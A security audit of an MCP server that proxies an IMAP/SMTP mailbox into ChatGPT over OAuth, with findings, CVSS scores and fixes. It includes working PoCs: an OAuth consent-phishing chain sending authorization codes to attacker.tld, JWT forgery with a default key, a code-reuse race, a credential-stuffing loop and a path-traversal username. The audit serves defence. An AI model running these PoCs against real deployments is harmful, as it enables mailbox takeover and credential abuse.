# Security Audit — `imap-smtp-mcp`

| Field | Value |
| --- | --- |
| Repository | `imap-smtp-mcp` |
| Commit (HEAD) | `bb5ecaafd132cbc5ff6ed9851d6a0bc2304a8158` |
| Investigation date | 2026-05-14 21:49 (UTC-07:00) |
| Auditor posture | Senior security analyst, OWASP/MCP focus |
| Methodology | Grey-box source review with attacker-from-outside threat model |
| Scope | `src/imap_smtp_mcp/`, `scripts/run_debug_server.py`, `Dockerfile`, `docker-compose.yml`, `env.example`, `docs/` |
| Out of scope | Third-party CVE scan beyond `cryptography>=42`, fuzzing, live network exploitation, malicious-operator scenarios |

---

## 1. Executive summary

`imap-smtp-mcp` is a self-hosted MCP server that proxies a real IMAP+SMTP account into ChatGPT through an OAuth2 (DCR + PKCE) flow. Credentials are entered by the end user on a server-hosted form, encrypted with Fernet, and stored in SQLite. JWT bearer tokens (HS256) are issued and validated against per-session SQLite rows.

The cryptographic primitives are well-chosen (`secrets`, `hmac.compare_digest`, Fernet, S256 PKCE), the destructive tool surface is gated by both OAuth scopes and operator-controlled action flags, and the container hardening is genuinely good (`USER mcp`, `read_only`, `cap_drop: ALL`, `no-new-privileges`). The author clearly cares about secret hygiene.

The dominant real-world risk class is **OAuth-flow abuse**, not memory-safety, command injection, or SQLi. Specifically:

1. Dynamic Client Registration is open and the consent UI lies to the user about who is requesting access ("ChatGPT is requesting…" is hardcoded). A determined attacker can convert the legitimate OAuth flow into a same-origin credential-capture page that returns full mailbox access.
2. Production secret enforcement only triggers on HTTPS public URLs, leaving an easy footgun for operators using `MCP_ALLOW_INSECURE_PUBLIC_URL=true` or loopback hostnames.
3. The credential form is an unrate-limited oracle for IMAP credential stuffing against the configured backend.

There are **no** findings in this audit that allow an unauthenticated remote attacker to take control of an arbitrary mailbox without victim interaction or a misconfiguration. The phishing chain (F-01) is the closest, and it requires social engineering plus a victim who trusts the deployment domain.

### Severity overview

| ID | Title | CVSSv3.1 | Severity |
| --- | --- | --- | --- |
| F-01 | Phishing-grade credential capture via unauthenticated DCR + opaque consent screen | 7.4 | High |
| F-02 | Default `OAUTH_SIGNING_KEY` / `OAUTH_COOKIE_SECRET` accepted on non-HTTPS / loopback deployments | 6.3 standalone, 9.1 if chained with DB read | Medium → Critical when chained |
| F-03 | Forged-token impact bounded only by session-ID secrecy | 4.3 | Medium |
| F-04 | Authorization-code TOCTOU on shared SQLite connection | 3.7 | Low |
| F-05 | No rate limiting / lockout on `/oauth/authorize` POST (IMAP credential stuffing oracle) | 5.3 | Medium |
| F-06 | Audit-log path traversal via subject (IMAP-server dependent) | 3.3 | Low |
| F-07 | Missing security headers on the HTML consent page | 4.3 | Medium (clickjacking on credential form) |
| F-08 | Documented proxy trust controls are dead code | 3.1 | Low (operator deception) |
| F-09 | Default `Server: BaseHTTP/0.6 Python/3.12.x` banner | 0.0 | Informational |
| F-10 | No detection on refresh-token reuse | 3.7 | Low |
| F-11 | Static "ChatGPT is requesting:" string regardless of registered `client_name` | 4.3 | Medium (UX half of F-01) |
| F-12 | Consent form does not display `client_id` / requested resource | 3.1 | Low (defensive UX) |
| F-13 | Healthcheck uses `ssl._create_unverified_context()` | 0.0 | Informational |

---

## 2. Threat model

The audit assumes:

- The server runs reachable on the public Internet behind HTTPS as the `docs/deployment.md` recommends.
- The attacker has **no source access** unless explicitly noted (grey-box only when justifying that source access does not improve the attack).
- The configured IMAP and SMTP backends (`IMAP_HOST`, `SMTP_HOST`) are honest. Malicious-operator scenarios are out of scope.
- The OAuth flow is intended for ChatGPT, but the server speaks RFC 7591 Dynamic Client Registration and will register any HTTP caller.
- The deployment uses the documented Docker hardening (read-only rootfs, dropped caps, non-root user). Where a finding is sensitive to that, it is called out.

The end user (mailbox owner) is treated as a non-expert who trusts the deployment domain.

---

## 3. Methodology

1. Read the entire MCP/OAuth surface (`server.py`, `oauth.py`, `tool_controller.py`) line-by-line.
2. Re-read each adapter (`imap_adapter.py`, `smtp_adapter.py`) with focus on injection, TLS, and timeout behavior.
3. Inspect the credential-handling path end to end: HTML form → CSRF cookie → IMAP verify → Fernet encrypt → SQLite → JWT issue → JWT verify → tool dispatch.
4. Inspect audit logging for secret leakage and write-side injection.
5. Inspect deployment artifacts (`Dockerfile`, `docker-compose.yml`, `env.example`, `docs/`) for misconfiguration footguns.
6. Map every finding back to a CVSSv3.1 vector and a real-world likelihood judgement.

PoCs in this report are **constructive** (designed against a local debug instance booted via `scripts/run_debug_server.py`). I did not execute them against a third-party deployment.

---

## 4. Findings

### F-01 — Phishing-grade credential capture via unauthenticated DCR + opaque consent screen

- **CVSSv3.1**: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` = **7.4 (High)**
- **CWE**: CWE-451 (User Interface Misrepresentation), CWE-1021 (Improper Restriction of Rendered UI Layers), CWE-345 (Insufficient Verification of Data Authenticity)
- **Affected**:
  - `src/imap_smtp_mcp/oauth.py` lines 407-430 (`OAuthService.register_client`)
  - `src/imap_smtp_mcp/oauth.py` lines 432-454 (`validate_authorize_request`)
  - `src/imap_smtp_mcp/server.py` lines 300-532 (`_login_form`, hardcoded "Authorize IMAP/SMTP MCP" / "ChatGPT is requesting" copy)

**Technical detail.** The consent page is the only point at which the user can reason about who they are about to hand IMAP+SMTP credentials to. Two design decisions combine to make that reasoning impossible:

1. `register_client` accepts any HTTPS `redirect_uris` from any unauthenticated caller and persists the new `client_id` permanently (`OAUTH_REQUIRED_SCOPES` is global, so the new client implicitly has the same scope ceiling as ChatGPT):

```407:430:src/imap_smtp_mcp/oauth.py
    def register_client(self, payload: dict[str, object]) -> dict[str, object]:
        redirect_uris = payload.get("redirect_uris")
        if not isinstance(redirect_uris, list) or not redirect_uris:
            raise OAuthError("invalid_client_metadata", "redirect_uris must be a non-empty list")
        normalized: list[str] = []
        for uri in redirect_uris:
            if not isinstance(uri, str) or not uri.startswith("https://"):
                raise OAuthError("invalid_redirect_uri", "redirect_uris must be absolute https URLs")
            normalized.append(uri)
        client_id = f"client-{secrets.token_urlsafe(24)}"
        client = OAuthClient(
            client_id=client_id,
            redirect_uris=tuple(normalized),
            client_name=str(payload.get("client_name") or "ChatGPT"),
        )
        self.store.save_client(client)
```

2. The HTML consent page hardcodes the verb "ChatGPT is requesting" regardless of the actual `client_name` of the requester:

```473:481:src/imap_smtp_mcp/server.py
<main>
<section class="panel" aria-labelledby="authorize-title">
<div class="intro">
<h1 id="authorize-title">Authorize IMAP/SMTP MCP</h1>
<p class="description">IMAP/SMTP MCP is a self-hosted mail connector that lets ChatGPT use your configured IMAP and SMTP account to list folders, search and read messages, send mail, and manage mailbox items according to the scopes you grant.</p>
<p><a class="repo-link" href="https://github.com/mrworf/imap-smtp-mcp" target="_blank" rel="noopener noreferrer">Read more on GitHub</a></p>
<p class="scope-line"><strong>ChatGPT is requesting:</strong> <span>{html.escape(", ".join(scopes))}</span></p>
{debug_warning}
</div>
```

Notice that the `client_id`, `client_name`, and `redirect_uri` of the requester are nowhere on the page. The user is told the request is from ChatGPT.

**Working PoC.** Against a local debug server at `https://mail-mcp.example.com`:

```bash
# 1. Attacker registers their own DCR client.
CLIENT=$(curl -sX POST https://mail-mcp.example.com/oauth/register \
  -H 'Content-Type: application/json' \
  -d '{"redirect_uris":["https://attacker.tld/cb"],"client_name":"Definitely ChatGPT"}' \
  | python -c 'import sys,json;print(json.load(sys.stdin)["client_id"])')

# 2. Attacker generates a PKCE pair locally.
python - <<'PY'
import base64, hashlib, secrets
verifier = secrets.token_urlsafe(48)
challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).rstrip(b'=').decode()
print(f"VERIFIER={verifier}\nCHALLENGE={challenge}")
PY
# -> attacker keeps VERIFIER, embeds CHALLENGE in the link.

# 3. Attacker mails the victim a "please reauthorize ChatGPT" link with their own client_id:
#    https://mail-mcp.example.com/oauth/authorize
#       ?response_type=code
#       &client_id=$CLIENT
#       &redirect_uri=https%3A%2F%2Fattacker.tld%2Fcb
#       &code_challenge=$CHALLENGE
#       &code_challenge_method=S256
#       &resource=https%3A%2F%2Fmail-mcp.example.com
#       &scope=mail%3Aread+mail%3Asend+mail%3Awrite
#       &state=anything
```

The victim sees the legitimate `mail-mcp.example.com` consent page (valid TLS, friendly copy, "ChatGPT is requesting"), enters real IMAP/SMTP credentials, and the form `POST`s. `authorize_with_credentials` calls the real IMAP server to verify the password (the user's own IMAP server even sees a legitimate login event, which makes the attack invisible to lightweight monitoring), encrypts the credentials, and 302-redirects an authorization code to `https://attacker.tld/cb`. The attacker exchanges:

```bash
curl -sX POST https://mail-mcp.example.com/oauth/token \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "grant_type=authorization_code" \
  --data-urlencode "code=$CODE" \
  --data-urlencode "client_id=$CLIENT" \
  --data-urlencode "redirect_uri=https://attacker.tld/cb" \
  --data-urlencode "code_verifier=$VERIFIER"
```

The returned access token is fully equivalent to a ChatGPT-issued token: it carries `mail:read mail:send mail:write`, the encrypted credentials live in a real session row, and `tools/call` works against the victim's mailbox. PKCE does not save the user here because the **attacker is the legitimate code requester** — that's exactly what PKCE binds to.

**Real-world likelihood.** Medium-high. The attack is identical in shape to ordinary OAuth-consent phishing (cf. ATT&CK T1550.001-adjacent techniques), but the deployment domain bears all the visual trust signals (TLS, branding, `imap-smtp-mcp` GitHub link in the page, "ChatGPT is requesting" copy). Anyone who has seen the legitimate flow once will not visually distinguish the attacker flow.

**Why not Critical (justification I'll defend).** The attack still requires (a) sending the link to the right victim, (b) the victim being in an "I should reauthorize" frame of mind, and (c) the operator not having pruned the DCR table. Confidentiality+Integrity are High because compromise of an email account is widely understood as catastrophic, but Availability is None — the legitimate user is not denied access. Hence `S:C/C:H/I:H/A:N` and 7.4. I would not push this to 8+ without UI-level deception bypass of a second factor (none exists; the form has a single password field).

**Recommended fix.**

- Move DCR behind operator approval, or restrict it to redirect_uris matching a configured allowlist regex (e.g., `https://chatgpt.com/connector_platform_oauth_redirect`). This is exactly what RFC 7591 §5 explicitly permits.
- In `_login_form`, render the **registered `client_name`**, the **`redirect_uri`** (preferably highlighted hostname), and the **requested scopes**. Treat `client_name` as untrusted text — escape it.
- Add a fixed warning banner if the resolved `client_name` does not match an operator-trusted allowlist of known clients (e.g., "This is not ChatGPT. Continue only if you recognize this application.").

---

### F-02 — Default `OAUTH_SIGNING_KEY` / `OAUTH_COOKIE_SECRET` accepted on non-HTTPS or loopback deployments

- **CVSSv3.1 (standalone)**: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = **6.3 (Medium)**
- **CVSSv3.1 (chained with read access to `oauth.sqlite3` or to anyone's JWT once)**: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N` = **9.1 (Critical)**
- **CWE**: CWE-798 (Use of Hard-coded Credentials), CWE-1188 (Insecure Default Initialization)
- **Affected**: `src/imap_smtp_mcp/config.py` lines 30-42, 152-159, 175-213

**Technical detail.** The defaults `OAUTH_SIGNING_KEY="dev-signing-key"`, `OAUTH_COOKIE_SECRET="dev-cookie-secret"`, and `OAUTH_ENCRYPTION_KEY=""` are only blocked when both:

```183:189:src/imap_smtp_mcp/config.py
    if urlparse(public_base_url).scheme == "https":
        if signing_key == "dev-signing-key":
            raise ConfigError("OAUTH_SIGNING_KEY must be set for production HTTPS deployments")
        if cookie_secret == "dev-cookie-secret":
            raise ConfigError("OAUTH_COOKIE_SECRET must be set for production HTTPS deployments")
        if not encryption_key:
            raise ConfigError("OAUTH_ENCRYPTION_KEY must be set for production HTTPS deployments")
```

…and `_validate_https_public_url` opens two escapes:

```152:159:src/imap_smtp_mcp/config.py
def _validate_https_public_url(public_base_url: str) -> None:
    allow_insecure = _parse_bool("MCP_ALLOW_INSECURE_PUBLIC_URL", False)
    parsed = urlparse(public_base_url)
    if parsed.scheme == "https":
        return
    if allow_insecure or parsed.hostname in {"127.0.0.1", "localhost"}:
        return
    raise ConfigError("MCP_PUBLIC_BASE_URL must use https in production")
```

So a deployment that uses `MCP_PUBLIC_BASE_URL=http://internal-host:8000`, or `MCP_ALLOW_INSECURE_PUBLIC_URL=true`, or any URL whose hostname is `127.0.0.1`/`localhost` (e.g., reverse-proxied internally) will boot with `dev-signing-key`. The Token signer signs with that key:

```104:127:src/imap_smtp_mcp/oauth.py
class TokenSigner:
    def __init__(self, signing_key: str) -> None:
        self._key = signing_key.encode("utf-8")

    def issue(self, claims: TokenClaims) -> str:
        ...
        signature = hmac.new(self._key, signing_input.encode("ascii"), hashlib.sha256).digest()
```

Anyone who notices the deployment (and can guess that it might be using defaults) can mint tokens without touching the OAuth flow.

**Working PoC (forge a token with default key).**

```python
import base64, hmac, hashlib, json, time

def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

key = b"dev-signing-key"
header  = {"alg":"HS256","typ":"JWT"}
payload = {
  "iss": "http://127.0.0.1:8000",
  "aud": "http://127.0.0.1:8000",
  "sub": "victim@example.com",
  "scope": "mail:read mail:send mail:write",
  "sid": "sess-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",   # <-- BLOCKER
  "exp": int(time.time()) + 3600,
  "iat": int(time.time()),
}
si = f'{b64url(json.dumps(header,separators=(",",":")).encode())}.{b64url(json.dumps(payload,separators=(",",":")).encode())}'
sig = hmac.new(key, si.encode(), hashlib.sha256).digest()
print(f'{si}.{b64url(sig)}')
```

The blocker is `sid`: `authenticate_bearer` requires a real session row in SQLite:

```614:629:src/imap_smtp_mcp/oauth.py
    def authenticate_bearer(self, authorization_header: str | None, *, required_scopes: tuple[str, ...] = ()) -> tuple[TokenClaims, MailCredentials]:
        ...
        claims = self.signer.verify(...)
        session = self.store.get_session(claims.session_id)
        if session is None or session.revoked:
            raise OAuthError("invalid_session", "Credential session is no longer available")
        credentials = self.vault.decrypt(session.encrypted_credentials)
        return claims, credentials
```

`session_id` is `secrets.token_urlsafe(24)` (192 bits of entropy) and is never logged in audit files (`audit.py` records `mcp_user`/`subject` only). So a pure remote forgery cannot be turned into mailbox access — **standalone severity is Medium (6.3)**, not High.

The picture changes the moment the attacker has any read primitive against `oauth.sqlite3` (a separate disk-read or SQLi in a future feature, a stolen backup, a docker-volume snapshot, etc.). Then forging a token → decrypting the session → mailbox compromise is one step. This is the **chained-Critical (9.1)** path.

I am explicitly **not** rating this as standalone High because there is no evidence path I could find to leak session IDs over the network with the current codebase.

**Recommended fix.**

- Drop the loopback / `MCP_ALLOW_INSECURE_PUBLIC_URL` exemption in `_load_oauth_config`'s production-secret check. The cost of failing fast on a debug instance is one extra env var; the cost of a misconfigured prod deployment is total compromise.
- Reject `signing_key`/`cookie_secret` values that match either the literal default *or* are shorter than ~32 bytes of entropy. Operator footguns of "just changed it slightly" are common.
- Document a one-shot generator (`python -c 'import secrets;print(secrets.token_urlsafe(48))'`) the same way `OAUTH_ENCRYPTION_KEY` is documented.

---

### F-03 — Forged-token impact bounded only by session-ID secrecy

- **CVSSv3.1**: `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` = **4.3 (Medium)**
- **CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
- **Affected**: `src/imap_smtp_mcp/oauth.py` lines 614-629

**Technical detail.** This finding exists to prevent the audit reader from over-rating F-02. The only thing standing between a default-signing-key deployment and arbitrary mailbox compromise is the secrecy of the 192-bit `session_id`. That is cryptographically sufficient *today* but is a single-layer defense:

- `session_id` is not bound to the bearer token's `sub` (subject is informational only — `vault.decrypt` runs on whatever session is named).
- There is no per-token revocation list — only the session row's `revoked` flag.
- There is no kid/key-rotation mechanism.

If a future feature introduces a route that returns `sid` (for example, an admin endpoint, a debug endpoint with `MCP_DEBUG_UNREDACTED_LOGS=true` accidentally including JWT payloads, or a proxy log capture), F-02 immediately becomes Critical.

**Recommended fix.**

- Bind tokens to subject in addition to session_id at verification time; require `claims.subject == session.subject` in `authenticate_bearer`.
- Treat `session_id` as a secret in audit logs and any future debug surfaces (add it to `SECRET_FIELD_MARKERS` if it ever appears in logged structures).
- Plan a JWT `kid` field and a key list to allow rotation without invalidating live sessions.

---

### F-04 — Authorization-code TOCTOU on shared SQLite connection

- **CVSSv3.1**: `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` = **3.7 (Low)**
- **CWE**: CWE-367 (Time-of-check Time-of-use Race)
- **Affected**:
  - `src/imap_smtp_mcp/oauth.py` lines 199-247 (single shared `sqlite3.connect(check_same_thread=False)`)
  - `src/imap_smtp_mcp/oauth.py` lines 519-533 (`exchange_code` reads-then-writes `used`)

**Technical detail.** `OAuthService.exchange_code` performs:

```519:533:src/imap_smtp_mcp/oauth.py
        code = self.store.get_code(code_value)
        if code is None:
            raise OAuthError("invalid_grant", "Unknown authorization code")
        if code.used:
            raise OAuthError("invalid_grant", "Authorization code has already been used")
        ...
        self.store.save_code(AuthorizationCode(**{**code.__dict__, "used": True}))
```

Each `OAuthStore.save_code`/`get_code` is its own implicit transaction over a `ThreadingHTTPServer`-shared connection. Two concurrent `POST /oauth/token` requests with the same code can both observe `used=False` and both end up issuing tokens before either marks `used=True`. The threading server uses one Python thread per request, so the race window is real.

**Working PoC concept.** An attacker who has captured an authorization code (via a network observer on the redirect_uri TLS-protected hop, a misconfigured logging proxy, or a referer leak from the redirect_uri target) can race the legitimate client:

```bash
for i in 1 2 3 4 5 6 7 8; do
  curl -sX POST https://mail-mcp.example.com/oauth/token \
    -d "grant_type=authorization_code&code=$CODE&client_id=$CLIENT&redirect_uri=$URI&code_verifier=$VERIFIER" &
done
wait
```

If at least one of those races interleaves with the legitimate exchange, both succeed. RFC 6749 §4.1.2 explicitly says the AS "MUST invalidate" the code and SHOULD revoke any tokens issued to that authorization code if a code is presented twice — neither happens here.

**Real-world likelihood.** Low. Capturing a code requires breaking the redirect_uri TLS hop, controlling the redirect endpoint, or being in the browser session. Confidentiality is rated High because the consequence is full mailbox tokens, but the attack chain is fragile.

**Recommended fix.**

- Replace the read-then-write with a conditional UPDATE: `UPDATE authorization_codes SET used = 1 WHERE code = ? AND used = 0` and treat `cursor.rowcount == 0` as `invalid_grant`.
- Bonus: when a code is presented twice, revoke the session created by it (per RFC 6749 §4.1.2 / RFC 6819 §5.2.1.1).

---

### F-05 — No rate limiting / lockout on `/oauth/authorize` POST (IMAP credential-stuffing oracle)

- **CVSSv3.1**: `AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:L` = **5.3 (Medium)**
- **CWE**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-799 (Improper Control of Interaction Frequency)
- **Affected**:
  - `src/imap_smtp_mcp/server.py` lines 135-161 (`_handle_authorize_post`)
  - `src/imap_smtp_mcp/oauth.py` lines 456-510, 631-638 (`authorize_with_credentials` → `_verify_imap_login`)

**Technical detail.** Every POST to `/oauth/authorize` triggers a full IMAP login against the configured backend:

```631:638:src/imap_smtp_mcp/oauth.py
    def _verify_imap_login(self, username: str, password: str) -> None:
        try:
            client = ImapAdapter(self.config).connect(username, password)
            logout = getattr(client, "logout", None)
            if callable(logout):
                logout()
        except ImapAdapterError as exc:
            raise OAuthError("access_denied", "IMAP login failed") from exc
```

There is no rate limiting, no exponential backoff, no per-IP cap, and no per-username cap. The HTTP error response (`OAuthError("access_denied", "IMAP login failed")`) is identical for "wrong password" and "no such user", which is good, but the response time differs (the adapter retries up to `IMAP_MAX_RETRIES=2` on transient errors — see `imap_adapter.py:74-89`), giving a partial timing oracle.

**Working PoC.**

```bash
# 1. Register a throwaway client + start a single authorize GET to capture the CSRF cookie + raw_query.
curl -c jar.txt -s "https://mail-mcp.example.com/oauth/authorize?response_type=code&client_id=$CID&redirect_uri=$URI&code_challenge=$CH&code_challenge_method=S256&resource=$RES&scope=mail%3Aread+mail%3Asend+mail%3Awrite" >/tmp/page.html
CSRF=$(grep -oE 'name="csrf_token" value="[^"]+"' /tmp/page.html | cut -d'"' -f4)
QUERY='response_type=code&client_id=...'  # same raw_query as above

# 2. Brute / stuff against the configured IMAP backend through the public MCP server.
while read -r user pass; do
  curl -b jar.txt -s -o /dev/null -w "%{http_code} $user\n" \
    -X POST "https://mail-mcp.example.com/oauth/authorize?$QUERY" \
    --data-urlencode "csrf_token=$CSRF" \
    --data-urlencode "imap_username=$user" \
    --data-urlencode "imap_password=$pass" \
    --data-urlencode "smtp_username=$user" \
    --data-urlencode "smtp_password=$pass" \
    --data-urlencode "sender_display_name=x" \
    --data-urlencode "sender_email=$user"
done < creds.txt
```

The same CSRF cookie + `raw_query` is reusable until the cookie expires because cookie validity is bound to a SHA-256 of the query string, not to a one-shot nonce. A single GET buys an attacker arbitrarily many POSTs.

**Impact.**

- The MCP server becomes an unattributed proxy for credential-stuffing the *real* IMAP host. Defenders looking at IMAP login logs see authentication attempts originating from the MCP server's IP, not the attacker's.
- Many providers lock accounts after N failed logins, so the same flow is a denial-of-service primitive against the legitimate mailbox owner. Hence `A:L` in the vector. `S:C` because the attack changes the security state of a different component (the IMAP backend / its accounts).

**Recommended fix.**

- Implement a per-IP and per-`imap_username` token bucket (e.g., 5 attempts / 15 min) on `/oauth/authorize` POST. Track failures in SQLite or in-process.
- Make CSRF cookies single-use (rotate the bound token after each POST), so an attacker cannot script unbounded POSTs from a single GET.
- Optionally add a small artificial delay (e.g., 250ms) on `access_denied` responses to throttle high-rate stuffing.

---

### F-06 — Audit-log path traversal via subject (IMAP-server dependent)

- **CVSSv3.1**: `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:L` = **3.3 (Low)**
- **CWE**: CWE-22 (Path Traversal), CWE-73 (External Control of File Name or Path)
- **Affected**: `src/imap_smtp_mcp/audit.py` lines 33-76

**Technical detail.**

```70:76:src/imap_smtp_mcp/audit.py
    def _write_line(self, username: str, line: str) -> None:
        file_path = self._log_dir / f"{username}.log"
        with self._lock:
            self._rotate_if_needed(file_path, len(line) + 1)
            with file_path.open("a", encoding="utf-8") as f:
                f.write(line)
                f.write("\n")
```

`username` is `event.mcp_user or SYSTEM_LOG`. `mcp_user` flows from `claims.subject`, which flows from `imap_username` typed into the OAuth form. There is no sanitization in either `authorize_with_credentials` or `_write_line`. `Path("/var/lib/imap-smtp-mcp/audit") / "../../../home/mcp/.bashrc"` resolves to a real path outside the audit directory, and `.open("a")` will append to (or create) that file.

**Real-world likelihood.** Low. The username must round-trip through a successful IMAP login, so the configured IMAP server has to accept an arbitrary username string containing `/` or `..`. Mainstream providers (Gmail, FastMail, Microsoft 365, dovecot with `auth_username_format=%Lu`) reject those. Custom servers configured to accept arbitrary auth strings (some cyrus / proprietary deployments) are vulnerable.

**Working PoC (against a permissive IMAP server only).**

1. Stand up a deliberately permissive IMAP server that accepts any username/password (or use one in a corporate test environment).
2. Authorize through the OAuth flow with `imap_username = ../../../tmp/owned`.
3. Call any tool. The MCP audit logger writes to `<audit_dir>/../../../tmp/owned.log` under the `mcp` UID.

**Impact (when triggered).**

- Integrity: append arbitrary bytes (the audit JSON line) to any `.log` file the `mcp` user can write to.
- Availability: append to log files monitored by alerting (could fill disk or trigger noisy alerts).
- Not Confidentiality (this is a write primitive only).

**Recommended fix.**

- Validate `imap_username` against a strict character class at the OAuth form boundary, e.g., `^[A-Za-z0-9._@+-]{1,254}$`. Reject anything containing `/`, `\`, `..`, control chars, NULs.
- In `AuditLogger._write_line`, additionally `username = re.sub(r'[^A-Za-z0-9._@+-]', '_', username)` and truncate to a sane length, as defense in depth.
- Optionally hash-bucket usernames into a fixed-size set of files (e.g., `audit/<sha256(username)[:2]>.log`) and store the original in the JSON record.

---

### F-07 — Missing security headers on the HTML consent page

- **CVSSv3.1**: `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` = **4.3 (Medium)**
- **CWE**: CWE-1021 (Improper Restriction of Rendered UI Layers — clickjacking)
- **Affected**: `src/imap_smtp_mcp/server.py` lines 269-277 (`_send_html`) and 121-133 (`_handle_authorize_get`)

**Technical detail.** `_send_html` sets only `Content-Type` and `Content-Length`. The credential-collection HTML page is therefore framable, has no MIME-sniff protection, has no CSP, and ships the full Referer to any link it contains.

```269:277:src/imap_smtp_mcp/server.py
    def _send_html(self, value: str, *, headers: dict[str, str] | None = None) -> None:
        body = value.encode("utf-8")
        self.send_response(HTTPStatus.OK)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        for key, item in (headers or {}).items():
            self.send_header(key, item)
        self.end_headers()
        self.wfile.write(body)
```

**Real-world likelihood.** The realistic attack here is clickjacking the Authorize button on the credential page. A type-credentials-then-click flow is harder to clickjack than a one-click consent, but a UI-redress chain can still trick the user into submitting the form (an attacker page autofills via DOM events on the focused iframe — though browsers vary on cross-origin focus + key handling). I am rating this Medium because chaining clickjacking with the F-01 phishing flow gives an attacker a way to consume any stolen IMAP credentials with one click.

**Recommended fix.** Set on every HTML response (and ideally on the JSON responses too, at least `X-Content-Type-Options`):

```text
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; form-action 'self'; frame-ancestors 'none'; base-uri 'none'
```

`form-action 'self'` is particularly valuable here because it would prevent the action attribute from being subverted via a future XSS into POSTing credentials elsewhere.

---

### F-08 — Documented proxy trust controls are dead code

- **CVSSv3.1**: `AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:N` = **3.1 (Low)**
- **CWE**: CWE-1059 (Insufficient Technical Documentation), CWE-451 (UI Misrepresentation, applied to operator UI = config docs)
- **Affected**:
  - `src/imap_smtp_mcp/server.py` lines 597-601 (definition)
  - No other reference in the source tree (verified by `rg`)

**Technical detail.** `MCP_TRUST_PROXY_HEADERS` and `MCP_ALLOWED_PROXY_CIDRS` are loaded into `ServerConfig` and tested in unit tests, but no request-handling path consults `is_trusted_proxy` or any `X-Forwarded-*` header. The `docs/deployment.md` section "Recommended reverse proxy deployment" tells the operator to enable these; an operator who reads the docs will reasonably believe the server respects forwarded scheme/host and that proxy spoofing is mitigated by `MCP_ALLOWED_PROXY_CIDRS`.

**Impact.** No direct vulnerability — the server never trusts forwarded headers, so an attacker cannot poison scheme/host from outside. The risk is that the misleading documentation will create *future* vulnerabilities when someone wires the proxy headers into Cookie `Secure`/`Domain` decisions or the bearer audience. Today this is an operator-deception finding, hence the low CVSS.

**Recommended fix.** Either implement the documented behavior (consult `X-Forwarded-Proto` from a `is_trusted_proxy(client_ip)` peer to decide HTTPS context) or delete the dead config + docs. A halfway state is the worst outcome.

---

### F-09 — Default `Server: BaseHTTP/0.6 Python/3.12.x` banner

- **CVSSv3.1**: `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N` = **0.0 (Informational)**
- **CWE**: CWE-200 (Information Exposure)
- **Affected**: Python `http.server.BaseHTTPRequestHandler` default behavior, no override in `MCPRequestHandler`.

`BaseHTTPRequestHandler.send_response` automatically emits a `Server:` header containing the Python version. This is universal Python `http.server` behavior, doesn't expose anything that affects exploit selection meaningfully, and is informational only. Override `version_string()` if you want to suppress it.

---

### F-10 — No detection on refresh-token reuse

- **CVSSv3.1**: `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` = **3.7 (Low)**
- **CWE**: CWE-294 (Authentication Bypass by Capture-replay)
- **Affected**: `src/imap_smtp_mcp/oauth.py` lines 564-609 (`exchange_refresh_token`)

**Technical detail.** Refresh-token rotation is correctly implemented (old hash revoked, new hash stored). What is missing is the canonical "previous token reused → revoke the entire session" detector recommended by [draft-ietf-oauth-security-topics §4.13.2](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-25#section-4.13.2). Today, if an attacker steals a refresh token *before* the legitimate client uses it, the attacker silently rotates and continues; the legitimate client's next refresh attempt fails with `invalid_grant` ("Refresh token has been revoked") and the user re-authorizes — but the attacker keeps their session.

**Recommended fix.** When `record.revoked` is True at refresh time, treat it as evidence of compromise: revoke the corresponding `credential_sessions` row (`session.revoked = 1`) so all derived access tokens stop working at the next bearer check.

---

### F-11 — Static "ChatGPT is requesting:" string regardless of registered `client_name`

- **CVSSv3.1**: `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` = **4.3 (Medium)**
- **CWE**: CWE-451 (User Interface Misrepresentation of Critical Information)
- **Affected**: `src/imap_smtp_mcp/server.py` lines 477-479, 121-133

This is the consent-UI half of F-01 separated for clean tracking. A patch for F-11 in isolation is straightforward (render `client.client_name` and `client.redirect_uris` from the validated client object) and meaningfully reduces F-01's chance of success by exposing attacker-supplied identifiers like `Definitely ChatGPT` or `https://attacker.tld/cb` to the user.

If F-01 is fixed by allowlisting redirect_uris and DCR, F-11 drops to Low.

---

### F-12 — Consent form does not display `client_id` / requested resource

- **CVSSv3.1**: `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` = **3.1 (Low)**
- **CWE**: CWE-451 (UI Misrepresentation)
- **Affected**: `src/imap_smtp_mcp/server.py` lines 121-133, 300-532

Defensive UX. Even after F-11 is fixed, sophisticated phishing can register a client with `client_name="ChatGPT"`. Display the redirect_uri origin prominently — it cannot be spoofed because it must match the registered list.

---

### F-13 — Healthcheck uses `ssl._create_unverified_context()`

- **CVSSv3.1**: `AV:L/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:N` = **0.0 (Informational)**
- **CWE**: CWE-295 (Improper Certificate Validation)
- **Affected**: `Dockerfile` line 35, `docker-compose.yml` line 29

The healthcheck connects to `127.0.0.1` over the loopback interface. A man-in-the-middle on `lo` inside a container with `cap_drop: ALL` and `read_only` is not realistic. Acceptable; calling out for completeness because cert-bypass calls in TLS code paths usually warrant attention.

---

## 5. Positive findings (explicitly cleared)

